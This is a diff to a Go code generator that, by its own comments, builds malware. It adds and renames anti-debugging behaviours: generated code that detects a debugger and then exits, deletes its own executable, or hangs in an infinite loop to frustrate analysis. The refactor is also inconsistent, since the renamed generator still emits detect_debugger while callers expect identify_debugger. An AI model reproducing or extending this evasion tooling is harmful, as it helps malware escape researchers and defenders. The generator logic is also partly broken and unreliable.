@@ -91,11 +91,16 @@ func generate_main_function(s_json string, boot_functions []string, loop_functio
 
 	// Decide the header of the foor loop
 	if data_object.Debugger_behavior == "stop" {
-		main_functions = append(main_functions, "for !detect_debugger() {")
+		main_functions = append(main_functions, "for !stop_behavior() {")
+
 	} else if data_object.Debugger_behavior == "remove" {
-		main_functions = append(main_functions, "for !debugger_detection_removal() {")
+		main_functions = append(main_functions, "for !remove_behavior() {")
+
 	} else if data_object.Debugger_behavior == "none" {
 		main_functions = append(main_functions, "for {")
+
+	} else if data_object.Debugger_behavior == "loop" {
+		main_functions = append(main_functions, "for !loop_behavior() {")
 	}
 
 	// Add loop function
@@ -225,10 +230,10 @@ func generate_structs(s_json string) string {
 
 //
 //
-// Generate the debugger detection function
+// Identify the debugger
 //
 //
-func generate_debugger_detection(s_json string) string {
+func identify_debugger(s_json string) string {
 	data_object := structure.Receive(s_json)
 	body := []string{"func detect_debugger() bool {", "toReturn := false"}
 
@@ -278,15 +283,36 @@ func generate_debugger_detection(s_json string) string {
 
 //
 //
+// Generate the debugger detection function
+//
+//
+func stop_behavior(s_json string) string {
+	data_object := structure.Receive(s_json)
+	body := []string{"func stop_behavior() bool {",
+		"toReturn := false",
+		"toReturn = identify_debugger()",
+		"if toReturn {",
+		"os.Exit(42)",
+		"}"}
+
+	body = append(body, "return toReturn", "}")
+	data_object.Add_go_function(body)
+	data_object.Add_go_import("os")
+
+	return structure.Send(data_object)
+}
+
+//
+//
 // Generates the code which will remove the malware
 // after it has been launched in a debugger
 //
 //
-func generate_removal_malware(s_json string) string {
+func remove_behavior(s_json string) string {
 	data_object := structure.Receive(s_json)
-	body := []string{"func debugger_detection_removal() bool {",
+	body := []string{"func remove_behavior() bool {",
 		"toReturn := false",
-		"toReturn = detect_debugger()",
+		"toReturn = identify_debugger()",
 		"if toReturn {",
 		"path := tools.Grab_executable_path()",
 		"os.Remove(path)",
@@ -302,6 +328,47 @@ func generate_removal_malware(s_json string) string {
 
 //
 //
+// Generates the code which will cause the malware to enter an infinite loop
+//
+//
+func loop_behavior(s_json string) string {
+	data_object := structure.Receive(s_json)
+	body := []string{"func loop_behavior() bool {",
+		"toReturn := false",
+		"toReturn = detect_debugger()",
+		"if toReturn {",
+		"for {",
+		"}}"}
+
+	body = append(body, "return toReturn", "}")
+	data_object.Add_go_function(body)
+
+	return structure.Send(data_object)
+}
+
+//
+//
+// Generate behavior function for debugging
+//
+//
+func generate_behavior_debugging(s_json string) string {
+	data_object := structure.Receive(s_json)
+	s_json = identify_debugger(s_json) // Adds neccessary code
+
+	switch data_object.Debugger_behavior {
+	case "stop":
+		s_json = stop_behavior(s_json)
+	case "remove":
+		s_json = remove_behavior(s_json)
+	case "loop":
+		s_json = loop_behavior(s_json)
+	}
+
+	return s_json
+}
+
+//
+//
 // Parses the contents of the provided file
 //
 //
@@ -310,9 +377,7 @@ func Parse(s_json string) string {
 
 	s_json = generate_structs(s_json)
 
-	s_json = generate_debugger_detection(s_json)
-
-	s_json = generate_removal_malware(s_json)
+	s_json = generate_behavior_debugging(s_json)
 
 	s_json, boot_func, loop_func := generate_sub_functions(s_json)
 
